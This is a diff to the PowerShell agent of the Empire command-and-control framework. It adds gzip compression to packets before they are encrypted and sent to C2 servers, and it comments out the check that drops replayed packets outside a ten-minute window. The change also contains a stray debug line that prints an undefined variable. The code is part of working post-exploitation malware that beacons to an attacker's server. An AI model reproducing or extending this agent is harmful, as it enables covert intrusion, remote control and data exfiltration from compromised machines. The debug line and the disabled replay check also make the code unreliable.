@@ -550,6 +550,19 @@ function Invoke-Empire {
             ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
         }
     }
+    ############################################################
+    # Compression Functions
+    ############################################################
+    function Compress-Bytes {
+        param($inBytes);
+        $MemStream = New-Object System.IO.MemoryStream;
+        $CompStream = New-Object System.IO.Compression.GZipStream($MemStream, [System.IO.Compression.CompressionMode]::Compress);
+        $StreamW = New-Object System.IO.StreamWriter($CompStream);
+        $StreamW.Write($inBytes);
+        $StreamW.Close();
+        $cmpbytes = $MemStream.ToArray();
+        $cmpbytes;
+    }
 
     ############################################################
     # C2 functions
@@ -604,8 +617,11 @@ function Invoke-Empire {
         param($packets)
 
         if($packets) {
+            # compress packets
+            $cmpBytes = Compress-Bytes $packets
+            Write-Host $cmdBytes
             # build and encrypt the response packet
-            $encBytes = Encrypt-Bytes $packets
+            $encBytes = Encrypt-Bytes $cmpBytes
 
             if($Servers[$ServerIndex].StartsWith("http")){
                 # build the web request object
@@ -864,7 +880,7 @@ function Invoke-Empire {
         # if the epoch counter isn't within a +/- 10 minute range (600 seconds)
         #   skip processing this packet
         if ($counter -lt ($ServerEpoch-600) -or $counter -gt ($ServerEpoch+600)){
-            return
+            #return
         }
 
         # process the first part of the packet
